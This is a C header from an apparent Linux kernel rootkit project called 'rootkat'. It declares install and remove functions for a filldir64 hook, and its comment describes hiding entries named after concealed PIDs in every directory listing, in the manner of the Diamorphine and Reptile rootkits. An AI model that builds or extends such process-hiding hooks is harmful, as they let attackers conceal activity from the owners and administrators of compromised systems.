/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_FILLDIR64_H
#define ROOTKAT_HOOK_FILLDIR64_H

/*
 * filldir64 hook — filters entries whose name parses as a hidden PID.
 * Affects ALL directory listings (not just /proc), matching the
 * Diamorphine/Reptile pattern. Side effect: a file literally named
 * after a hidden PID number anywhere on the filesystem will also be
 * filtered. Acceptable for v1; document if it surprises a user.
 */
int rootkat_hook_filldir64_install(void);
void rootkat_hook_filldir64_remove(void);

#endif
